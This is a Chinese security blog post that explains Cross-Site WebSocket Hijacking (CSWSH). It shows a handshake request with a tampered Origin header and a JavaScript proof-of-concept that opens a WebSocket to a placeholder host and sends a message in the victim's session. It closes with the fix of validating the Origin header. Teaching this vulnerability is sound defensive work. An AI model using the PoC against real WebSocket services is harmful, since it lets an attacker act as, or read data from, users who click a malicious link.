<!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1" /> <title>浅谈WebSocket跨域劫持漏洞(CSWSH) · Chen's Blog</title> <meta name="description" content="WebSocket 跨域劫持漏洞"> <meta name="keywords" content="WebSocket 跨域劫持漏洞"> <link rel="icon" href="http://localhost:4000/assets/favicon.png"> <link rel="apple-touch-icon" href="http://localhost:4000/assets/touch-icon.png"> <link rel="preconnect" href="https://fonts.googleapis.com"> <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin> <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;0,700;1,400;1,700&display=swap" rel="stylesheet"> <link rel="stylesheet" href="http://localhost:4000/assets/core.css"> <link rel="canonical" href="http://localhost:4000/archives/2019-03-20/1"> <link rel="alternate" type="application/atom+xml" title="Chen's Blog" href="http://localhost:4000/feed.xml" /> <link href="/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" media="all" /> <script> var _hmt = _hmt || []; (function() { var hm = document.createElement("script"); hm.src = "https://hm.baidu.com/hm.js?e4a42a371cc5994ee02b940034c29658"; var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s); })(); </script> <script> window.giscusThemeConfig = { light: "light_protanopia", dark: "dark_tritanopia" }; </script> <script src="/assets/js/theme.js"></script> </head> <body> <button class="theme-toggle" id="themeToggle" aria-label="Switch Theme"> <!-- 太阳图标 (在深色模式显示) --> <svg id="icon-sun" viewBox="0 0 24 24"> <path d="M12 7c-2.76 0-5 2.24-5 5s2.24 5 5 5 5-2.24 5-5-2.24-5-5-5zM2 13h2c.55 0 1-.45 1-1s-.45-1-1-1H2c-.55 0-1 .45-1 1s.45 1 1 1zm18 0h2c.55 0 1-.45 1-1s-.45-1-1-1h-2c-.55 0-1 .45-1 1s.45 1 1 1zM11 2v2c0 .55.45 1 1 1s1-.45 1-1V2c0-.55-.45-1-1-1s-1 .45-1 1zm0 18v2c0 .55.45 1 1 1s1-.45 1-1v-2c0-.55-.45-1-1-1s-1 .45-1 1zM5.99 4.58c-.39-.39-1.03-.39-1.41 0-.39.39-.39 1.03 0 1.41l1.06 1.06c.39.39 1.03.39 1.41 0s.39-1.03 0-1.41L5.99 4.58zm12.37 12.37c-.39-.39-1.03-.39-1.41 0-.39.39-.39 1.03 0 1.41l1.06 1.06c.39.39 1.03.39 1.41 0 .39-.39.39-1.03 0-1.41l-1.06-1.06zm1.06-10.96c.39-.39.39-1.03 0-1.41-.39-.39-1.03-.39-1.41 0l-1.06 1.06c-.39.39-.39 1.03 0 1.41s1.03.39 1.41 0l1.06-1.06zM7.05 18.36c.39-.39.39-1.03 0-1.41-.39-.39-1.03-.39-1.41 0l-1.06 1.06c-.39.39-.39 1.03 0 1.41s1.03.39 1.41 0l1.06-1.06z" /> </svg> <!-- 月亮图标 (在亮色模式显示) --> <svg id="icon-moon" viewBox="0 0 24 24" style="display: none"> <path d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.16,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.06,6.83,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z" /> </svg> </button> <aside class="logo"> <a href="http://localhost:4000/"> <img src="/assets/avatar.jpg" class="logo-avatar"> </a> <span class="logo-prompt code">Back to Index</span> </aside> <article> <h1 class="title">EvilChen</h1> <div class="divider"></div> <center> <a href="https://github.com/gh0stkey" target="_blank">Github</a> | <a href="https://twitter.com/VulkeyChen" target="_blank">X (Twitter)</a> | <a href="/about" target="_blank">About</a> | <a href="/friends" target="_blank">Friends</a> </center> <div class="divider"></div> </article> <div id="content"> <article> <div class="center"> <h1 class="title">浅谈WebSocket跨域劫持漏洞(CSWSH)</h1> <time class="code">March 20, 2019</time> </div> <div class="divider"></div> <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&auto=1&id=28661853&height=66"></iframe> <h1 id="websocket-跨域劫持漏洞">WebSocket 跨域劫持漏洞</h1> <p>WebSocket 跨域劫持漏洞，英文名：<strong>Cross-site WebSocket Hijacking</strong>，漏洞类型：全能型CSRF（可读、可写）。</p> <h2 id="了解websocket">了解WebSocket</h2> <h3 id="websocket-优点">Websocket 优点</h3> <ol> <li>支持双向通信，实时性更强。</li> <li>更好的二进制支持。</li> <li>较少的控制开销。连接创建后，ws客户端、服务端进行数据交换时，协议控制的数据包头部较小。在不包含头部的情况下，服务端到客户端的包头只有2~10字节（取决于数据包长度），客户端到服务端的话，需要加上额外4字节的掩码。而HTTP协议每次通信都需要携带完整的头部。</li> <li>支持扩展。ws协议定义了扩展，用户可以扩展协议，或者实现自定义的子协议。（比如支持自定义压缩算法等）</li> </ol> <h3 id="websocket-如何建立连接">Websocket 如何建立连接</h3> <p>画了一张图让你了解：</p> <p><img src="/images/CSWSH/0.png" alt="websocket" /></p> <h2 id="漏洞产生">漏洞产生</h2> <p>建立Websocket连接无验证。</p> <h3 id="案例">案例</h3> <p>1.如下请求：</p> <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">localhost:8080</span>
<span class="na">Origin</span><span class="p">:</span> <span class="s">http://127.0.0.1:3000</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">Upgrade</span>
<span class="na">Upgrade</span><span class="p">:</span> <span class="s">websocket</span>
<span class="na">Sec-WebSocket-Version</span><span class="p">:</span> <span class="s">13</span>
<span class="na">Sec-WebSocket-Key</span><span class="p">:</span> <span class="s">w4v7O6xFTi36lq3RNcgctw==</span>

</code></pre></div></div> <p>篡改Origin，发现没有对Origin进行验证，也可以跨域进行协议升级。</p> <p>2.进一步验证</p> <p>2.1获取到了一个发送评论的请求 （<strong>使用BurpSuite-&gt;Proxy模块-&gt;Websockets History查看，这里是对应的 Direction值为Outgoing为发出的请求，Incoming为发出请求对应的响应信息</strong>）</p> <p><img src="/images/CSWSH/1.png" alt="test" /></p> <p>2.2使用JavaScript创建Websocket请求</p> <p><strong>如上图所示Outgoing的内容为“我是帅key的可爱小迷弟”，那么发送的数据就是这个</strong>。</p> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"utf-8"</span><span class="nt">&gt;</span>
<span class="nt">&lt;script&gt;</span>
<span class="kd">function</span> <span class="nx">ws_attack</span><span class="p">(){</span>
	<span class="kd">var</span> <span class="nx">ws</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebSocket</span><span class="p">(</span><span class="dl">"</span><span class="s2">ws://域名:端口/</span><span class="dl">"</span><span class="p">);</span><span class="c1">//如果请求的Websocket服务仅支持HTTP就写成ws://，如果请求的Websocket服务支持HTTPs就写成wss://</span>
	<span class="nx">ws</span><span class="p">.</span><span class="nx">onopen</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">evt</span><span class="p">)</span> <span class="p">{</span> 
		<span class="nx">ws</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">我是帅key的可爱小迷弟！</span><span class="dl">"</span><span class="p">);</span>
	<span class="p">};</span>
	<span class="nx">ws</span><span class="p">.</span><span class="nx">onmessage</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">evt</span><span class="p">)</span> <span class="p">{</span>
		<span class="nx">ws</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
	<span class="p">};</span>
<span class="p">}</span>
<span class="nx">ws_attack</span><span class="p">();</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div> <p>2.3验证发现可以请求并成功进行重放，存在Websocket跨域劫持</p> <p>（这里只是简单的评论请求，危害就是：点我链接让你评论我想评论的，试想：如果是修改密码的WebSocket请求存在劫持那么问题就大了～）</p> <h2 id="漏洞利用">漏洞利用</h2> <p>攻击流程跟以往的交互类漏洞没什么区别（点我链接读取你XXX、点我链接让你XXX）：</p> <p><img src="/images/CSWSH/2.png" alt="attack" /></p> <p>来一个圈子”铸剑实战靶场”的截图，自我体会：</p> <p><img src="/images/CSWSH/3.png" alt="success" /></p> <h3 id="poc代码编写">PoC代码编写</h3> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"utf-8"</span><span class="nt">&gt;</span>
<span class="nt">&lt;script&gt;</span>
<span class="kd">function</span> <span class="nx">ws_attack</span><span class="p">(){</span><span class="c1">//自定义函数ws_attack</span>
    <span class="c1">//定义函数功能</span>
    <span class="c1">//创建WebSocket并赋值给ws变量</span>
	<span class="kd">var</span> <span class="nx">ws</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebSocket</span><span class="p">(</span><span class="dl">"</span><span class="s2">ws://域名:端口/</span><span class="dl">"</span><span class="p">);</span><span class="c1">//如果请求的Websocket服务仅支持HTTP就写成ws://，如果请求的Websocket服务支持HTTPs就写成wss://</span>
	<span class="nx">ws</span><span class="p">.</span><span class="nx">onopen</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">evt</span><span class="p">)</span> <span class="p">{</span> 
        <span class="c1">//当ws(WebSocket)处于连接状态时执行</span>
		<span class="nx">ws</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">我是帅key的可爱小迷弟！</span><span class="dl">"</span><span class="p">);</span>
	<span class="p">};</span>
	<span class="nx">ws</span><span class="p">.</span><span class="nx">onmessage</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">evt</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">//当ws(WebSocket)请求有响应信息时执行</span>
        <span class="c1">//注意：响应的信息可以通过evt.data获取！例如：alert(evt.data);</span>
		<span class="nx">ws</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
	<span class="p">};</span>
<span class="p">}</span>
<span class="nx">ws_attack</span><span class="p">();</span><span class="c1">//执行ws_attact函数</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div> <h2 id="修复方法">修复方法</h2> <p>综合建议：校验Origin头</p> <h1 id="reference">Reference</h1> <p>https://www.cnblogs.com/chyingp/p/websocket-deep-in.html</p> </article> <div class="page-navigation code"> <a class="next" href="http://localhost:4000/archives/2019-06-27/1" title="NEXT: 基于BurpSuite快速探测越权-Authz插件">&lt;&lt;</a> <span> &middot; </span> <a class="home" href="http://localhost:4000/" title="Back to Index">INDEX</a> <span> &middot; </span> <a class="prev" href="http://localhost:4000/archives/2019-03-12/1" title="PREV: 记一次移动光猫（GM219-S）安全测试">&gt;&gt;</a> </div> <div class="comments"> <div id="giscus-container" class="giscus"></div> <script> (function() { const getTheme = () => { try { const savedTheme = localStorage.getItem('theme'); if (savedTheme) { return savedTheme; } } catch (e) {} if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) { return 'dark'; } const hour = new Date().getHours(); return (hour >= 6 && hour < 18) ? 'light' : 'dark'; }; const theme = getTheme(); const giscusTheme = theme === 'dark' ? 'dark_tritanopia' : 'light_protanopia'; const script = document.createElement('script'); script.src = "https://giscus.app/client.js"; script.setAttribute("data-repo", "gh0stkey/gh0stkey.github.io"); script.setAttribute("data-repo-id", "MDEwOlJlcG9zaXRvcnkzODc5NzEyMzU="); script.setAttribute("data-category", "Announcements"); script.setAttribute("data-category-id", "DIC_kwDOFx_4o84CyCUA"); script.setAttribute("data-mapping", "title"); script.setAttribute("data-strict", "0"); script.setAttribute("data-reactions-enabled", "0"); script.setAttribute("data-emit-metadata", "0"); script.setAttribute("data-input-position", "top"); script.setAttribute("data-lang", "zh-CN"); script.setAttribute("data-theme", giscusTheme); script.setAttribute("crossorigin", "anonymous"); script.async = true; document.getElementById('giscus-container').appendChild(script); })(); </script> </div> </div> <div class="footer"> <span class="block">&lt;/&gt; Copyright &copy; Chen's Blog (GH0ST.CN) 2016-2021</span> </div> <script src="/fancybox/lib/jquery-1.10.2.min.js"></script> <script type="text/javascript" src="/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script> <script> $(document).ready(function() { $("article img").each(function() { var strA = "<a style='text-decoration: none;' id='imgid' href='" + this.src + "'></a>"; $(this).wrapAll(strA); }); $(".block").html("&lt;/&gt; Copyright &copy; Chen's Blog (GH0ST.CN) 2016-" + (new Date()).getFullYear()); }); $("#imgid").fancybox({ openEffect : 'elastic', closeEffect : 'elastic', }); </script> </body> </html>
